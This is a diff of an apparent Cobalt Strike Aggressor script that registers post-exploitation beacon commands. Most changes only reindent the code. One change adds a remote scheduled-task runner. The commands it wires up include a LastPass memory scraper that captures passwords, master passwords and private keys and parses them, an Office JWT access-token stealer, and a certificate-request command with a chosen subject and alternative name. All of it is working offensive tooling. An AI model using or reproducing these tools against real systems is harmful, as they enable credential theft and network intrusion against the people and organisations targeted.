@@ -67,27 +67,27 @@ sub random_string
 # subrotine to parse options for script.
 # Returns options as a hash
 sub ops {
-	local('$count');
-	$count = 0;
-	%arguments = ohash();
-	foreach $arg ($1) {
-		if ($count > 0) {
-			if ($arg ismatch '/.*:.*') {
-				$arg = replace($arg, '\A/',"");
-				($key $val) = split(":", $arg, 2);
-				%arguments[$key] = $val;
-			}
-			else if ($arg ismatch '/.*') {
-				$arg = replace($arg, '\A/',"");
-				%arguments[$arg] = "TRUE";
-			}
-			else {
-				%arguments["$count"] = $arg;
-			}
-		}
-		$count = $count + 1;
-	}
-	return (%arguments);
+    local('$count');
+    $count = 0;
+    %arguments = ohash();
+    foreach $arg ($1) {
+        if ($count > 0) {
+            if ($arg ismatch '/.*:.*') {
+                $arg = replace($arg, '\A/',"");
+                ($key $val) = split(":", $arg, 2);
+                %arguments[$key] = $val;
+            }
+            else if ($arg ismatch '/.*') {
+                $arg = replace($arg, '\A/',"");
+                %arguments[$arg] = "TRUE";
+            }
+            else {
+                %arguments["$count"] = $arg;
+            }
+        }
+        $count = $count + 1;
+    }
+    return (%arguments);
 }
 
 ########################################
@@ -476,63 +476,63 @@ on beacon_output
         $id = left($message, 10);
 
         if ($id eq $id_lastpass){
-			@pid = unpack("I",substr($message,0xc,0x10));
-			@type_int = unpack("I",substr($message, 0x10, 0x14));
-			@buf_sz = unpack("I",substr($message, 0x14, 0x18));
+            @pid = unpack("I",substr($message,0xc,0x10));
+            @type_int = unpack("I",substr($message, 0x10, 0x14));
+            @buf_sz = unpack("I",substr($message, 0x14, 0x18));
 
-			$type = "";
-			if (@type_int[0] == 0){
-				$type = "JSON";
-			}else if (@type_int[0] == 1){
-				$type = "PWD_MEM_OBJECT";
-			}else if (@type_int[0] == 2){
-				$type = "AID";
-			}else if (@type_int[0] == 3){
-				$type = "NAME";
-			}else if (@type_int[0] == 4){
-				$type = "USERNAME";
-			}else if (@type_int[0] == 5){
-				$type = "PASSWORD";
-			}else if (@type_int[0] == 6){
-				$type = "G_LOCAL_KEY";
-			}else if (@type_int[0] == 7){
-				$type = "LOCAL_KEY";
-			}else if (@type_int[0] == 8){
-				$type = "MASTER_PASSWORD";
-			}else if (@type_int[0] == 9){
-				$type = "USER_CONFIG";
-			}else if (@type_int[0] == 10){
-				$type = "PRIV_KEY";
-			}
+            $type = "";
+            if (@type_int[0] == 0){
+                $type = "JSON";
+            }else if (@type_int[0] == 1){
+                $type = "PWD_MEM_OBJECT";
+            }else if (@type_int[0] == 2){
+                $type = "AID";
+            }else if (@type_int[0] == 3){
+                $type = "NAME";
+            }else if (@type_int[0] == 4){
+                $type = "USERNAME";
+            }else if (@type_int[0] == 5){
+                $type = "PASSWORD";
+            }else if (@type_int[0] == 6){
+                $type = "G_LOCAL_KEY";
+            }else if (@type_int[0] == 7){
+                $type = "LOCAL_KEY";
+            }else if (@type_int[0] == 8){
+                $type = "MASTER_PASSWORD";
+            }else if (@type_int[0] == 9){
+                $type = "USER_CONFIG";
+            }else if (@type_int[0] == 10){
+                $type = "PRIV_KEY";
+            }
 
-			if (@type_int[0] == 100)
-			{
-				$parser = script_resource("lastpass/process_lp_files.py");
-				$lp_files = script_resource("lastpass");
-				$parsed_return_file = script_resource("lastpass/out.txt");
-				@cmd = @("python3",$parser, $lp_files);
-				$ret = exec( @cmd );
-				sleep(1 * 1000);
-				blog($beacon, "exec ret: ". readAll($ret). "\n");
-				if(-exists $parsed_return_file) {
-					$returned_len = lof($parsed_return_file);
-					$fp = openf($parsed_return_file);
-					$output = readb($fp, $returned_len);
-					closef($fp);
-					deleteFile($parsed_return_file);
-					blog($beacon, "LastPass return value: \n" . $output);
-				}else{
-					println("Exec failed");
-					blog($beacon, "Exec failed");
-				}	
-			} else {
-				$lp_filename = script_resource("lastpass/lp_".@pid[0]."_".$type.".txt");
-				$handle = openf(">>".$lp_filename);
-				print($handle, "<MSG>");
-				print($handle, substr($message,0x18));
-				println($handle, "</MSG>");
-				closef($handle);
-			}	
+            if (@type_int[0] == 100)
+            {
+                $parser = script_resource("lastpass/process_lp_files.py");
+                $lp_files = script_resource("lastpass");
+                $parsed_return_file = script_resource("lastpass/out.txt");
+                @cmd = @("python3",$parser, $lp_files);
+                $ret = exec( @cmd );
+                sleep(1 * 1000);
+                blog($beacon, "exec ret: ". readAll($ret). "\n");
+                if(-exists $parsed_return_file) {
+                    $returned_len = lof($parsed_return_file);
+                    $fp = openf($parsed_return_file);
+                    $output = readb($fp, $returned_len);
+                    closef($fp);
+                    deleteFile($parsed_return_file);
+                    blog($beacon, "LastPass return value: \n" . $output);
+                }else{
+                    println("Exec failed");
+                    blog($beacon, "Exec failed");
+                }   
+            } else {
+                $lp_filename = script_resource("lastpass/lp_".@pid[0]."_".$type.".txt");
+                $handle = openf(">>".$lp_filename);
+                print($handle, "<MSG>");
+                print($handle, substr($message,0x18));
+                println($handle, "</MSG>");
+                closef($handle);
+            }   
 
         }
     }
@@ -1074,6 +1074,34 @@ Note:    If you are deleting a folder, it must be empty.
 "
 );
 
+#schtasksrun <OPT:HOSTNAME> <TASKNAME>
+alias schtasksrun
+{
+    local('$bid $args $server $taskname')
+    $bid = $1;
+    $server = "";
+    if ( size(@_) < 2)
+    {
+        berror($bid, "Invalid Usage");
+        berror($bid, beacon_command_detail("schtasksrun"));
+        return;
+    } else if(size(@_) == 2)
+    {
+        $taskname = $2;
+    } else if(size(@_) == 3)
+    {
+        $server = $2;
+        $taskname = $3;
+    } else
+    {
+        berror($bid, "Invalid Usage");
+        berror($bid, beacon_command_detail("schtasksrun"));
+        return;
+    }
+    $args = bof_pack($bid, "ZZ", $server, $taskname);
+    beacon_inline_execute($bid, readbof($bid, "schtasksrun"), "go", $args);
+}
+
 
 #schtasksstop <OPT:HOSTNAME> <TASKNAME>
 alias schtasksstop
@@ -1380,25 +1408,25 @@ beacon_command_register(
 );
 
 alias adcs_request {
-	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine');
+    local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine');
 
-	%params = ops(@_);
-	@keys = keys(%params);
-	
-	$adcs_request_ca = "";
-	$adcs_request_template = "";
-	$adcs_request_subject = "";
-	$adcs_request_altname = "";
-	$adcs_request_install = 0;
-	$adcs_request_machine = 0;
-	
-	if ("CA" in @keys) {
-		$adcs_request_ca = %params["CA"];
-	}
+    %params = ops(@_);
+    @keys = keys(%params);
+    
+    $adcs_request_ca = "";
+    $adcs_request_template = "";
+    $adcs_request_subject = "";
+    $adcs_request_altname = "";
+    $adcs_request_install = 0;
+    $adcs_request_machine = 0;
+    
+    if ("CA" in @keys) {
+        $adcs_request_ca = %params["CA"];
+    }
     else {
-		berror($1, beacon_command_detail("adcs_request"));
-		berror($1, "Need to provide the Certificate Authority at a minimum");
-		return;
+        berror($1, beacon_command_detail("adcs_request"));
+        berror($1, "Need to provide the Certificate Authority at a minimum");
+        return;
     }
     if ("TEMPLATE" in @keys) {
         $adcs_request_template = %params["TEMPLATE"];
@@ -1416,14 +1444,14 @@ alias adcs_request {
         $adcs_request_machine = 1;
     }
     
-	$args = bof_pack($1, "ZZZZss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine);
-	beacon_inline_execute($1, readbof($1, "adcs_request"), "go", $args);
+    $args = bof_pack($1, "ZZZZss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine);
+    beacon_inline_execute($1, readbof($1, "adcs_request"), "go", $args);
 }
 
 beacon_command_register(
-	"adcs_request",
-	"Request an enrollment certificate",
-	"
+    "adcs_request",
+    "Request an enrollment certificate",
+    "
 Command: adcs_request
 Summary: This command connects a certificate authority and requests an enrollment 
          certificate of the specified type for the specified subject and alternative 
@@ -1440,59 +1468,59 @@ Usage:   adcs_request /CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:a
 
 alias office_tokens 
 {
-	local('$pid $args');
-	if(size(@_) != 2)
-	{
-		berror($1, "usage: office_tokens <pid>");
-		return;
-	}
-	$pid = parseNumber($2, 10);
+    local('$pid $args');
+    if(size(@_) != 2)
+    {
+        berror($1, "usage: office_tokens <pid>");
+        return;
+    }
+    $pid = parseNumber($2, 10);
     berror($1, $pid);
 
-	$args = bof_pack($1, "i", $pid);
-	beacon_inline_execute($1, readbof($1, "office_tokens"), "go", $args);
+    $args = bof_pack($1, "i", $pid);
+    beacon_inline_execute($1, readbof($1, "office_tokens"), "go", $args);
 }
 
 beacon_command_register(
-	"office_tokens",
-	"Searches memory for Office JWT Access Tokens",
-	"Command: office_tokens
+    "office_tokens",
+    "Searches memory for Office JWT Access Tokens",
+    "Command: office_tokens
 
 Usage: office_tokens <pid> "
 );
 
 alias lastpass
 {
-	local('$pid $args $value $i $buffer $arg_sz');
-	$arg_sz = size(@_);
-	if(size(@_) < 2)
-	{
-		berror($1, "usage: lastpass <pid1> <pid2> <pid3> .. <pidn>");
-		return;
-	}
+    local('$pid $args $value $i $buffer $arg_sz');
+    $arg_sz = size(@_);
+    if(size(@_) < 2)
+    {
+        berror($1, "usage: lastpass <pid1> <pid2> <pid3> .. <pidn>");
+        return;
+    }
 
     $buffer = allocate(0);
 
-	for( $i = 1; $i < $arg_sz; $i++)
-	{
+    for( $i = 1; $i < $arg_sz; $i++)
+    {
         bwrite($buffer, "i", @_[$i]);
-	}
+    }
     bwrite($buffer, "i", 0); # null terminator at the end
     closef($buffer);
     $value = readb($buffer, -1);
 
-	$arg_sz = $arg_sz - 1;
+    $arg_sz = $arg_sz - 1;
 
-	berror($1, $arg_sz);
-	$args = bof_pack($1, "ib", $arg_sz, $value);
-	beacon_inline_execute($1, readbof($1, "lastpass"), "go", $args);
-	berror($1, "FINISHED");
+    berror($1, $arg_sz);
+    $args = bof_pack($1, "ib", $arg_sz, $value);
+    beacon_inline_execute($1, readbof($1, "lastpass"), "go", $args);
+    berror($1, "FINISHED");
 }
 
 beacon_command_register(
-	"lastpass",
-	"Searches memory for LastPass passwords and hashes",
-	"Command: lastpass 
+    "lastpass",
+    "Searches memory for LastPass passwords and hashes",
+    "Command: lastpass 
 
 Usage: lastpass <number of pids> <pid>,<pid>,<pid> ... "
 );
